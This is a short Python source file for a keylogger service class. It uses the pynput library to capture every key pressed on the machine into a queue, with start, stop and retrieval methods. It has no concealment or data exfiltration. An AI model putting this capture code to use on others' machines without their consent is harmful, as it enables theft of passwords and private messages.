from pynput import keyboard
import queue
from ikeylogger import IKeyLogger

class KeyLoggerService(IKeyLogger):
    def __init__(self, max_queue_size=1000):
        self.logged_keys = queue.Queue(maxsize=max_queue_size)
        self.listener = None

    def start_logging(self):
        def on_press(key):
            try:
                self.logged_keys.put(key.char)
            except AttributeError:
                self.logged_keys.put(str(key))

        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self):
        keys = []
        while not self.logged_keys.empty():
            keys.append(self.logged_keys.get())
        return keys